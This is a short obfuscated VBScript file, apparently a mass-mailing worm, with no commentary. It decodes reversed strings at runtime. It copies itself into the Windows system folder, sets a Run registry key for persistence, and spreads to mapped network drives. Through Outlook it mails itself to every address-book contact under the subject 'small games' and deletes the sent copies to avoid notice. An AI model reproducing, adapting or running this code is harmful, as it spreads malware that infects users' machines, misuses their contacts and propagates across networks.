' RC

On Error Resume Next

Dim B8YWQ
Dim I39SDC8U
Dim S3PPS
Dim YAGMG
Dim B0V82KV
Dim EI5D7
Dim RT23NXH
Dim LC1SVQK
Dim CQW4W
Dim UODTSKV

Set B8YWQ = CreateObject( KOGS4( "tcejbOmetsySeliF.gnitpircS" ) )
B8YWQ.CopyFile WScript.ScriptFullName, B8YWQ.BuildPath( B8YWQ.GetSpecialFolder(1), KOGS4( "SBV.752SR" ) )

Set I39SDC8U = CreateObject( KOGS4( "llehS.tpircSW" ) )
I39SDC8U.RegWrite KOGS4( "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" ) & KOGS4( "752SR" ), B8YWQ.BuildPath( B8YWQ.GetSpecialFolder(1), KOGS4( "SBV.752SR" ) )


Set S3PPS = CreateObject( KOGS4( "krowteN.tpircSW" ) )
Set B0V82KV = S3PPS.EnumNetworkDrives

If B0V82KV.Count <> 0 Then
   For YAGMG = 0 To B0V82KV.Count - 1
       If InStr( B0V82KV.Item( YAGMG), KOGS4( "\" ) ) <> 0 Then
          B8YWQ.CopyFile WScript.ScriptFullName, B8YWQ.BuildPath( B0V82KV.Item( YAGMG), KOGS4( "SBV.752SR" ) ) 
       End If
   Next
End If

YAGMG = I39SDC8U.RegRead( KOGS4( "\ENIHCAM_LACOL_YEKH" ) & KOGS4( "752SR" ) )

If YAGMG = "" Or YAGMG > 20 Then
   YAGMG = 0
End If

If YAGMG = 0 Then
   Set LC1SVQK = CreateObject( KOGS4( "noitacilppA.kooltuO" ) )
   Set EI5D7 = LC1SVQK.GetNameSpace( KOGS4( "IPAM" ) )

   For Each RT23NXH In EI5D7.AddressLists
       Set B0V82KV = LC1SVQK.CreateItem( 0 )

       For CQW4W = 1 To RT23NXH.AddressEntries.Count
           Set UODTSKV = RT23NXH.AddressEntries( CQW4W )

           If CQW4W = 1 Then
              B0V82KV.BCC = UODTSKV.Address
           Else
              B0V82KV.BCC = B0V82KV.BCC & KOGS4( " ;" ) & UODTSKV.Address
           End If
       Next

       B0V82KV.Subject = KOGS4( "semag llams" )
       B0V82KV.Body = KOGS4( "pus saw" )
       B0V82KV.Attachmets.Add WScript.ScriptFullName
       B0V82KV.DeleteAfterSubmit = True
       B0V82KV.Send
   Next

   YAGMG = 0
End If

I39SDC8U.RegWrite KOGS4( "\ENIHCAM_LACOL_YEKH" ) & KOGS4( "752SR" ), YAGMG + 1

Function KOGS4( LTXC7RZ )
   Dim U4CU3K1K
   Dim KW1A8WQ
   Dim M4MR0

   U4CU3K1K = ""

   For KW1A8WQ = 1 To Len( LTXC7RZ )
       M4MR0 = Mid( LTXC7RZ, KW1A8WQ, 1 )

       U4CU3K1K = M4MR0 & U4CU3K1K
   Next

   KOGS4 = U4CU3K1K
End Function
